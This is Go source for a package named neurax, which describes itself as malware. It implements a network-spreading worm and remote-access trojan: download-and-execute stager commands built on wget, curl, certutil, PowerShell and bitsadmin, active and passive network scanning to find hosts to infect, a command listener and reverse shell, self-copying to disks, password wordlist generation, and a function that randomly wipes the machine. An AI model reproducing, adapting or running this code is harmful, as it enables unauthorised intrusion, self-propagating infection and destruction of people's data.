package neurax

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	ps "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	cf "github.com/redcode-labs/Coldfire"
	"github.com/valyala/fasthttp"
	"github.com/yelinaung/go-haikunator"
	"github.com/zbiljic/go-filelock"
)

const (
	tearDownServer = time.Millisecond * 500
	listenerTick   = time.Millisecond * 10
)

var InfectedHosts []string
var ReceivedCommands []string

var spec = []string{"!", "!@", "!@#", "!@#$", "!@#$%"}

var LangExecutors = map[string]string{
	"python_os":         `import os; os.system("COMMAND")`,
	"python_subprocess": `import subprocess; subprocess.call("COMMAND", shell=True)`,
	"javascript":        `var shl = WScript.CreateObject("WScript.Shell"); shl.Run("COMMAND");`,
	"php":               `exec("COMMAND")`,
	"ruby":              "`COMMAND`",
	"perl":              `system("COMMAND");`,
	"lua":               `os.execute("COMMAND")`,
	"mysql":             `\! COMMAND`,
	"redis":             `eval "os.execute('COMMAND')"`,
}

type (
	// Config has all features of neurax malware that can be configured
	Config struct {
		Stager                   string
		StagerSudo               bool
		StagerBg                 bool
		StagerRetry              int
		StagerRemovalDelay       bool
		Port                     int
		CommPort                 int
		CommProto                string
		LocalIp                  string
		Path                     string
		FileName                 string
		Platform                 string
		Cidr                     string
		ScanPassive              bool
		ScanActive               bool
		ScanActiveTimeout        int
		ScanPassiveTimeout       int
		ScanPassiveIface         string
		ScanPassiveAll           bool
		ScanPassiveNoArp         bool
		ScanFast                 bool
		ScanShaker               bool
		ScanShakerPorts          []int
		ScanFirst                []string
		ScanArpCache             bool
		ScanActiveThreads        int
		ScanFullRange            bool
		ScanGatewayFirst         bool
		ScanFirstOnly            bool
		Base64                   bool
		ScanRequiredPort         int
		Verbose                  bool
		Remove                   bool
		ScanInterval             string
		ScanHostInterval         string
		ReverseListener          string
		ReverseProto             string
		PreventReexec            bool
		ExfilAddr                string
		WordlistExpand           bool
		WordlistMutators         []string
		WordlistPermuteNum       int
		WordlistPermuteSeparator string
		WordlistShuffle          bool
		AllocNum                 int
		Blacklist                []string
		FastHTTP                 bool
		Debug                    bool
		NoInfectCheck            bool
	}
	// Rat keeps a self copping and RAT malware capabilities
	Rat struct {
		cfg Config
	}
)

// Default is a default configuration for neurax malware
var Default = Config{
	Stager:                   "random",
	StagerSudo:               false,
	StagerBg:                 false,
	StagerRetry:              0,
	StagerRemovalDelay:       true,
	Port:                     6741, //coldfire.RandomInt(2222, 9999),
	CommPort:                 7777,
	CommProto:                "udp",
	ScanRequiredPort:         0,
	LocalIp:                  cf.GetLocalIp(),
	Path:                     ".",
	FileName:                 "random",
	Platform:                 runtime.GOOS,
	Cidr:                     cf.GetLocalIp() + "/24",
	ScanPassive:              false,
	ScanActive:               true,
	ScanActiveTimeout:        2,
	ScanPassiveTimeout:       50,
	ScanPassiveIface:         "default",
	ScanPassiveAll:           false,
	ScanPassiveNoArp:         false,
	ScanFast:                 false,
	ScanShaker:               false,
	ScanShakerPorts:          []int{21, 80},
	ScanFirst:                []string{},
	ScanArpCache:             false,
	ScanActiveThreads:        10,
	ScanFullRange:            false,
	ScanGatewayFirst:         false,
	ScanFirstOnly:            false,
	Base64:                   false,
	Verbose:                  false,
	Remove:                   false,
	ScanInterval:             "2m",
	ScanHostInterval:         "none",
	ReverseListener:          "none",
	ReverseProto:             "udp",
	PreventReexec:            true,
	ExfilAddr:                "none",
	WordlistExpand:           false,
	WordlistMutators:         []string{"single_upper", "encapsule"},
	WordlistPermuteNum:       2,
	WordlistPermuteSeparator: "-",
	WordlistShuffle:          false,
	AllocNum:                 5,
	Blacklist:                []string{},
	FastHTTP:                 false,
	Debug:                    false,
	NoInfectCheck:            true,
}

// New creates pointer to instance of Rat
func New(cfg Config) *Rat {
	return &Rat{cfg}
}

// ReportError reports error in verbose way
func (rat *Rat) ReportError(message string, e error) {
	if e != nil && rat.cfg.Verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if rat.cfg.Remove {
			if err := os.Remove(os.Args[0]); err != nil {
				os.Exit(1)
			}
		}
	}
}

// StagerLang uses specified language
func (rat *Rat) StagerLang(name string) string {
	return strings.Replace(LangExecutors[name], "COMMAND", rat.Stager(), -1)
}

// Stager prepares command stager that downloads and executes current binary
func (rat *Rat) Stager() string {
	var stagers [][]string
	var stager []string
	var paths []string
	var b64Decoder string
	var sudo string
	stagerRetry := strconv.Itoa(rat.cfg.StagerRetry + 1)
	windowsStagers := [][]string{
		{"certutil", `for /l %%Neurax in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH/FILENAME`},
		{"powershell", `for /l %%Neurax in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH/FILENAME`},
		{"bitsadmin", `for /l %%Neurax in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH\FILENAME`},
	}
	linuxStagers := [][]string{
		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
		{"httrack", `SUDO apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
	}
	linuxSavePaths := []string{"/tmp", "/lib", "~",
		"/etc", "/usr", "/usr/share"}
	windowsSavePaths := []string{`%SYSTEMDRIVE%\$recycle.bin\`, `%ALLUSERSAPPDATA%\MicrosoftHelp\`}
	var background string
	switch rat.cfg.Platform {
	case "windows":
		stagers = windowsStagers
		paths = windowsSavePaths
		if rat.cfg.Base64 {
			b64Decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
		if rat.cfg.StagerBg {
			background = "start /b"
		}
	case "linux", "darwin":
		stagers = linuxStagers
		paths = linuxSavePaths
		if rat.cfg.Base64 {
			b64Decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
		if rat.cfg.StagerBg {
			background = "> /dev/null 2>&1 &"
		}
	}
	if rat.cfg.Stager == "random" {
		stager = cf.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == rat.cfg.Stager {
				stager = st
			}
		}
	}
	selectedStagerCommand := stager[1]
	if rat.cfg.Stager == "chain" {
		chainedCommands := make([]string, 0, len(stagers))
		for s := range stagers {
			st := stagers[s]
			chainedCommands = append(chainedCommands, st[1])
		}
		separator := ";"
		if runtime.GOOS == "windows" {
			separator = "&&"
		}
		selectedStagerCommand = strings.Join(chainedCommands, " "+separator+" ")
	}
	if rat.cfg.Path == "random" {
		rat.cfg.Path = cf.RandomSelectStr(paths)
	}
	if rat.cfg.Path == "." {
		selectedStagerCommand = strings.Replace(selectedStagerCommand, "SAVE_PATH/", "./", -1)
		selectedStagerCommand = strings.Replace(selectedStagerCommand, "SAVE_PATH\\", "", -1)
	}
	if rat.cfg.FileName == "random" {
		rat.cfg.FileName = cf.RandomString(cf.RandomInt(4, 10))
	}
	if rat.cfg.FileName == "random" && rat.cfg.Platform == "windows" {
		rat.cfg.FileName += ".exe"
	}
	if rat.cfg.StagerSudo {
		sudo = "sudo"
	}
	var removalDelay string
	if rat.cfg.StagerRemovalDelay {
		removalDelay = "sleep 5"
	}
	parsedURL, err := url.Parse(fmt.Sprintf("http://%s:%d/%s", rat.cfg.LocalIp, rat.cfg.Port, rat.cfg.FileName))
	if err != nil {
		os.Exit(1)
	}
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "URL", parsedURL.String(), -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "FILENAME", rat.cfg.FileName, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "SAVE_PATH", rat.cfg.Path, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "B64", b64Decoder, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "SUDO", sudo, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "RETRY", stagerRetry, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "BACKGROUND", background, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "REMOVAL_DELAY", removalDelay, -1)
	rat.Debug("Created command stager: " + selectedStagerCommand)
	return selectedStagerCommand
}

// Server start server serving binary self as bytes or base64 encoded string
func (rat *Rat) Server(cancel context.CancelFunc) {
	nflck, err := filelock.New(".nflck") // TODO: figure what we want to achieve here
	if err != nil {
		os.Exit(1)
	}
	defer func() {
		if err := nflck.Unlock(); err != nil {
			os.Exit(1)
		}
	}()
	data, err := os.ReadFile(os.Args[0])
	if err != nil {
		os.Exit(1)
	}
	if rat.cfg.Base64 {
		data = []byte(cf.B64E(string(data)))
	}

	h := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.ServeContent(w, r, rat.cfg.FileName, time.Now(), bytes.NewReader(data))
	})

	server := &http.Server{Addr: fmt.Sprintf(":%v", fmt.Sprintf(":%d", rat.cfg.Port)), Handler: h}
	idleCC := make(chan struct{})
	go handleShutdown(server, idleCC)
	if err := server.ListenAndServe(); err != http.ErrServerClosed {
		os.Exit(1)
	}
	cancel()
	<-idleCC
}

func handleShutdown(srv *http.Server, idleCC chan struct{}) {
	sigint := make(chan os.Signal, 1)
	signal.Notify(sigint, os.Interrupt)
	<-sigint

	ctx, cancel := context.WithTimeout(context.Background(), tearDownServer)
	defer cancel()
	if err := srv.Shutdown(ctx); err != nil {
		os.Exit(1)
	}
	close(idleCC)
}

// IsHostActive validates is port active when at least one port is open
func (rat *Rat) IsHostActive(target string) bool {
	if cf.Contains(rat.cfg.Blacklist, target) {
		return false
	}
	if rat.cfg.ScanShaker {
		for _, port := range rat.cfg.ScanShakerPorts {
			timeout := time.Duration(rat.cfg.ScanActiveTimeout) * time.Second
			portStr := strconv.Itoa(port)
			_, err := net.DialTimeout("tcp", target+portStr, timeout)
			if err == nil {
				rat.Debug("Found active host: " + target)
				return true
			}
		}
	} else {
		first := 19
		last := 200
		if rat.cfg.ScanFullRange {
			last = 65535
		}
		if rat.cfg.ScanFast {
			rat.cfg.ScanActiveTimeout = 2
			rat.cfg.ScanActiveThreads = 20
			first = 21
			last = 81
		}
		pscan := ps.NewPortScanner(target, time.Duration(rat.cfg.ScanActiveTimeout)*time.Second, rat.cfg.ScanActiveThreads)
		openedPorts := pscan.GetOpenedPort(first, last)
		if len(openedPorts) != 0 {
			if rat.cfg.ScanRequiredPort == 0 {
				rat.Debug("Found active host: " + target)
				return true
			} else {
				if cf.PortscanSingle(target, rat.cfg.ScanRequiredPort) {
					rat.Debug("Found active host: " + target)
					return true
				}
			}
		}
	}
	return false
}

// IsHostInfected validates if host is infected with Neurax
func (rat *Rat) IsHostInfected(target string) bool {
	if rat.cfg.NoInfectCheck {
		return false
	}
	if cf.Contains(rat.cfg.Blacklist, target) {
		return false
	}
	if cf.Contains(InfectedHosts, target) {
		return true
	}
	targetUrl := fmt.Sprintf("http://%s:%d/", target, rat.cfg.Port)
	if rat.cfg.FastHTTP {
		req := fasthttp.AcquireRequest() // TODO: we are not using this package it in Server, go with one approach, use or do not use external lib
		defer fasthttp.ReleaseRequest(req)
		req.SetRequestURI(targetUrl)
		resp := fasthttp.AcquireResponse()
		defer fasthttp.ReleaseResponse(resp)
		err := fasthttp.Do(req, resp)
		if err != nil {
			return false
		}
		if resp.StatusCode() == fasthttp.StatusOK {
			InfectedHosts = append(InfectedHosts, target)
			InfectedHosts = cf.RemoveFromSlice(InfectedHosts, rat.cfg.LocalIp)
			rat.Debug("Found infected host: " + target)
			return true
		}
	} else {
		rsp, err := http.Get(targetUrl)
		if err != nil {
			return false
		}
		if rsp.StatusCode == 200 {
			InfectedHosts = append(InfectedHosts, target)
			InfectedHosts = cf.RemoveFromSlice(InfectedHosts, rat.cfg.LocalIp)
			rat.Debug("Found infected host: " + target)
			return true
		}
		return false
	}
	return false
}

func (rat *Rat) handleCommand(cmd string) {
	if cmd == "purge" {
		rat.PurgeSelf()
	}
	if rat.cfg.PreventReexec {
		if cf.Contains(ReceivedCommands, cmd) {
			return
		}
		ReceivedCommands = append(ReceivedCommands, cmd)
	}
	if _, err := cf.CmdOut(cmd); err != nil {
		os.Exit(1)
	}
}

// OpenComm opens port and waits form command
func (rat *Rat) OpenComm(ctx context.Context) {
	l, err := net.Listen(rat.cfg.CommProto, "0.0.0.0:"+strconv.Itoa(rat.cfg.CommPort))
	rat.ReportError("Comm listen error", err)
	t := time.NewTicker(listenerTick)
L:
	for {
		select {
		case <-ctx.Done():
			break L
		case <-t.C:
			conn, err := l.Accept()
			if err != nil {
				rat.ReportError("Conn accept error", err)
				continue
			}
			buff := make([]byte, 1024)
			l, err := conn.Read(buff)
			if err != nil {
				rat.ReportError("Conn read error", err)
				continue
			}
			cmd := string(buff[:l-1])
			rat.Debug("Received command: " + cmd)
			go rat.handleCommand(cmd)
			if err := conn.Close(); err != nil {
				rat.ReportError(" Conn close error", err)
				continue
			}
		}
	}
}

// Reverse launches a reverse shell. Each received command is passed to handleCommand func
func (rat *Rat) Reverse(ctx context.Context) {
	conn, _ := net.Dial(rat.cfg.ReverseProto, rat.cfg.ReverseListener)
	t := time.NewTicker(listenerTick)
L:
	for {
		select {
		case <-ctx.Done():
			break L
		case <-t.C:
			command, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				os.Exit(1)
			}
			command = strings.TrimSuffix(command, "\n")
			go rat.handleCommand(command)
		}
	}
}

func (rat *Rat) scanPassiveSingleIface(f func(string), iface string) {
	var snapshotLen int32 = 1024
	timeout := time.Duration(rat.cfg.ScanPassiveTimeout) * time.Second
	if rat.cfg.ScanFast {
		timeout = 50 * time.Second
	}
	handler, err := pcap.OpenLive(iface, snapshotLen, false, timeout)
	rat.ReportError("Cannot open device", err)
	if !rat.cfg.ScanPassiveNoArp {
		if err := handler.SetBPFFilter("arp"); err != nil {
			rat.ReportError(" Set BPF filter error", err)
			return
		}
	}
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer != nil {
			ip, _ := ipLayer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != rat.cfg.LocalIp && !rat.IsHostInfected(source) && source != "255.255.255.255" {
				go f(source)
			}
			if destination != rat.cfg.LocalIp && !rat.IsHostInfected(destination) && destination != "255.255.255.255" {
				go f(destination)
			}
		}
	}
}

func (rat *Rat) scanPassive(f func(string)) {
	currentIface, _ := cf.Iface()
	ifacesToUse := []string{currentIface}
	if rat.cfg.ScanPassiveIface != "default" {
		ifacesToUse = []string{rat.cfg.ScanPassiveIface}
	}
	devices, err := pcap.FindAllDevs()
	deviceNames := make([]string, 0, len(devices))
	for _, dev := range devices {
		deviceNames = append(deviceNames, dev.Name)
	}
	rat.ReportError("Cannot obtain network interfaces", err)
	if rat.cfg.ScanPassiveAll {
		ifacesToUse = append(ifacesToUse, deviceNames...)
	}
	for _, device := range ifacesToUse {
		go rat.scanPassiveSingleIface(f, device)
	}
}

func targetsLookup(targets []string) []string {
	res := make([]string, 0, len(targets))
	for _, target := range targets {
		if cf.RegexMatch("ip", target) {
			res = append(res, target)
		} else {
			ipAddr, err := cf.DnsLookup(target)
			if err != nil {
				return []string{}
			}
			res = append(res, ipAddr...)
		}
	}
	return res
}

func (rat *Rat) scanActive(f func(string)) {
	var targets []string
	if rat.cfg.ScanGatewayFirst {
		gateway := cf.GetGatewayIP()
		targets = append(targets, gateway)
		rat.Debug("Added gateway to targets pool: " + gateway)
	}
	if len(rat.cfg.ScanFirst) != 0 {
		targets = append(targets, targetsLookup(rat.cfg.ScanFirst)...)
	}
	if rat.cfg.ScanFirstOnly {
		targets = targetsLookup(rat.cfg.ScanFirst)
	}
	if rat.cfg.ScanArpCache {
		for ip := range arp.Table() {
			if !rat.IsHostInfected(ip) {
				targets = append(targets, ip)
			}
		}
		rat.Debug(cf.F("Found %d targets in ARP cache", len(arp.Table())))
	}
	fullAddrRange, _ := cf.ExpandCidr(rat.cfg.Cidr)
	for _, addr := range fullAddrRange {
		if !cf.Contains(rat.cfg.Blacklist, addr) {
			targets = append(targets, addr)
		}
	}
	targets = cf.RemoveFromSlice(targets, rat.cfg.LocalIp)
	for _, target := range targets {
		rat.Debug("Scanning " + target)
		if rat.IsHostActive(target) && !rat.IsHostInfected(target) {
			rat.Debug("Scanned " + target)
			go f(target)
			if rat.cfg.ScanHostInterval != "none" {
				time.Sleep(time.Duration(cf.IntervalToSeconds(rat.cfg.ScanHostInterval)) * time.Second)
			}
		}
	}
}

func (rat *Rat) scanCore(f func(string)) {
	if rat.cfg.ScanPassive {
		go rat.scanPassive(f)
	}
	if rat.cfg.ScanActive {
		go rat.scanActive(f)
	}
}

// Scan scans network for new hosts
func (rat *Rat) Scan(f func(string)) {
	for {
		rat.scanCore(f)
		time.Sleep(time.Duration(cf.IntervalToSeconds(rat.cfg.ScanInterval)))
	}
}

// Debug prints msg if debug is on
func (rat *Rat) Debug(msg string) {
	if rat.cfg.Debug {
		cf.PrintInfo(msg)
	}
}

// Disks copies current binary to all found disks
func Disks() error {
	selectedName := genHaiku()
	if runtime.GOOS == "windows" {
		selectedName += ".exe"
	}
	disks, err := cf.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := cf.CopyFile(os.Args[0], d+"/"+selectedName)
		if err != nil {
			return err
		}
	}
	return nil
}

// ZIPSelf the binary zips itself and saves under save name in archive
func ZIPSelf() error {
	archiveName := os.Args[0] + ".zip"
	filesToZip := []string{os.Args[0]}
	return cf.MakeZip(archiveName, filesToZip)
}

func genHaiku() string {
	h := haikunator.New(time.Now().UTC().UnixNano())
	return h.Haikunate()
}

// Purge removes binary from all nodes that can be reached
func (rat *Rat) Purge() {
	DataSender := cf.SendDataUDP
	if rat.cfg.CommProto == "tcp" {
		DataSender = cf.SendDataTCP
	}
	for _, host := range InfectedHosts {
		err := DataSender(host, rat.cfg.CommPort, "purge")
		rat.ReportError("Cannot perform purge", err)
	}
	rat.handleCommand("purge")
}

// PurgeSelf removes binary from host and quits
func (rat *Rat) PurgeSelf() {
	if err := os.Remove(os.Args[0]); err != nil {
		os.Exit(1)
	}
	os.Exit(0)
}

// WordEncapsulate encapsulates word in punctuations marks
func WordEncapsulate(word string) []string {
	return []string{
		"!" + word + "!",
		"?" + word + "?",
		":" + word + ":",
		"@" + word + "@",
		"#" + word + "#",
		"$" + word + "$",
		"%" + word + "%",
		"^" + word + "^",
		"&" + word + "&",
		"*" + word + "*",
		"(" + word + ")",
		"[" + word + "",
		"<" + word + ">",
	}
}

// WordCyrillicReplace replaces cyrillic chars with ascii chars
func WordCyrillicReplace(word string) []string { // TODO: why not use us utf8 encode mapping
	var wordlist []string
	refs := map[string]string{
		"й": "q", "ц": "w", "у": "e",
		"к": "r", "е": "t", "н": "y",
		"г": "u", "ш": "i", "щ": "o",
		"з": "p", "ф": "a", "ы": "s",
		"в": "d", "а": "f", "п": "g",
		"р": "h", "о": "j", "л": "k",
		"д": "l", "я": "z", "ч": "x",
		"с": "c", "м": "v", "и": "b",
		"т": "n", "ь": "m"}

	rusWord := word
	for k, v := range refs {
		rusWord = strings.Replace(rusWord, v, k, -1)
	}
	wordlist = append(wordlist, rusWord)
	return wordlist
}

// WordSingleUpperTransform transforms word to uppercase letter slice
func WordSingleUpperTransform(word string) []string {
	res := make([]string, 0, utf8.RuneCountInString(word))
	for i := range word {
		splitted := strings.Fields(word)
		splitted[i] = strings.ToUpper(splitted[i])
		res = append(res, strings.Join(splitted, ""))
	}
	return res
}

// WordBasicLeet
func WordBasicLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0", "i": "1",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

// WordFullLeet
func WordFullLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0",
		"t": "7", "s": "5", "S": "$", "h": "#", "i": "1",
		"u": "v",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

// WordRevert reverts word to the slice of letters
func WordRevert(word string) []string {
	return []string{cf.Revert(word)}
}

// WordDuplicate duplicates word in to the slice of letters
func WordDuplicate(word string) []string {
	return []string{word + word}
}

// WordCharSwap swaps first and last rune/char in string
func WordCharSwap(word string) []string {
	w := []rune(word)
	w[0], w[len(w)] = w[len(w)], w[0]
	return []string{string(w)}
}

// WordSpecialCharsAppend appends special chars to the word
func WordSpecialCharsAppend(word string) []string {
	res := make([]string, 0, len(spec))
	for _, s := range spec {
		res = append(res, word+s)
	}
	return res
}

// WordSpecialCharsPrepend prepends special characters to
func WordSpecialCharsPrepend(word string) []string {
	res := make([]string, 0, len(spec))
	for _, s := range spec {
		res = append(res, s+word)
	}
	return res
}

// RussianRoulette deletes all data in the machines
func RussianRoulette() error {
	if cf.RandomInt(1, 6) == 6 {
		return cf.Wipe()
	}
	return nil
}

// Wordlist transformed words from input slice
func (rat *Rat) Wordlist(words ...string) []string {
	useAll := cf.Contains(rat.cfg.WordlistMutators, "all")
	var wordlist []string
	/*for i := 0; i < rat.cfg.WordlistCommonNum; i++ {
		wordlist = append(wordlist, CommonPasswords[i])
	}
	if len(rat.cfg.WordlistCommonCountries) != 0 {
		for cn, num := range rat.cfg.WordlistCommonCountries {
			wordlist = append(wordlist, CommonPasswordsCountries[cn][0:num]...)
		}
	}*/
	for _, word := range words {
		firstToUpper := strings.ToUpper(string(word[0])) + word[1:]
		lastToUpper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)-1]))
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, firstToUpper)
		wordlist = append(wordlist, lastToUpper)
		wordlist = append(wordlist, firstToUpper+"1")
		wordlist = append(wordlist, firstToUpper+"12")
		wordlist = append(wordlist, firstToUpper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
		if rat.cfg.WordlistExpand {
			if cf.Contains(rat.cfg.WordlistMutators, "encapsule") || useAll {
				wordlist = append(wordlist, WordEncapsulate(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "cyryllic") || useAll {
				wordlist = append(wordlist, WordCyrillicReplace(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "single_upper") || useAll {
				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "basic_leet") || useAll {
				wordlist = append(wordlist, WordBasicLeet(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "full_leet") || useAll {
				wordlist = append(wordlist, WordFullLeet(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "revert") || useAll {
				wordlist = append(wordlist, WordRevert(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "duplicate") || useAll {
				wordlist = append(wordlist, WordDuplicate(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "char_swap") || useAll {
				wordlist = append(wordlist, WordCharSwap(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "special_append") || useAll {
				wordlist = append(wordlist, WordSpecialCharsAppend(word)...)
			}
			if cf.Contains(rat.cfg.WordlistMutators, "special_prepend") || useAll {
				wordlist = append(wordlist, WordSpecialCharsPrepend(word)...)
			}
		}
	}
	if cf.Contains(rat.cfg.WordlistMutators, "permute") || useAll {
		wordlist = append(wordlist, rat.WordlistPermute(words...)...)
	}
	wordlist = cf.RemoveDuplicatesStr(wordlist)
	if rat.cfg.WordlistShuffle {
		wordlist = cf.ShuffleSlice(wordlist)
	}
	return wordlist
}

// WordlistPermute permutes words in to slice
func (rat *Rat) WordlistPermute(words ...string) []string {
	res := make([]string, 0, len(words))
	permuted := ""
	sep := rat.cfg.WordlistPermuteSeparator
	for _, word := range words {
		curPermLen := len(strings.Split(permuted, sep))
		selected := cf.RandomSelectStr(words)
		if !strings.Contains(permuted, selected) && curPermLen < rat.cfg.WordlistPermuteNum {
			permuted += word + sep + selected + sep
			res = append(res, permuted)
		}
	}
	return res[:]
}

// SetTTL sets TTL
func (rat *Rat) SetTTL(interval string) {
	firstExec := time.Now()
	for {
		time.Sleep(time.Duration(10))
		passed := time.Since(firstExec).Seconds()
		if int(passed) > cf.IntervalToSeconds(interval) {
			rat.PurgeSelf()
		}
	}
}

// Migrate migrates binary from currant path to path
func (rat *Rat) Migrate(path string) error {
	currentPath, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	if strings.Contains(currentPath, path) {
		return nil
	}
	rat.Debug("Migrating -> " + path)
	return cf.CopyFile(os.Args[0], path)
}

// Alloc allocates from 10 MB to 600 MB of memory
func (rat *Rat) Alloc() {
	minAlloc := cf.SizeToBytes("10m")
	maxAlloc := cf.SizeToBytes("600m")
	for n := 0; n < rat.cfg.AllocNum; n++ {
		numBytes := cf.RandomInt(minAlloc, maxAlloc)
		_ = make([]byte, numBytes) // FIXME: This will be deallocated by the GC asap. assign to global variable so it will live for the time binary lives in memory
	}
}
